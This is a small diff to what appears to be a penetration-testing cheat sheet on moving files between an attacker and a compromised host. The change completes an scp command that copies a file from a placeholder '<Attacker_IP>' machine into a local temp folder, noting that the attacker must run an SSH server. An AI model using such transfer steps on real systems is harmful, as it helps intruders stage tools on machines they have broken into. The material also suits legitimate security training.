@@ -234,7 +234,7 @@ WindPS-2> cd new_disk:
 The attacker has to have SSHd running.
 
 ```bash
-scp <username>@<Attacker_IP>:<directory>/<filename> 
+scp <username>@<Attacker_IP>:<directory>/<filename> <to_folder/tmp/>
 ```
 
 ## SSHFS
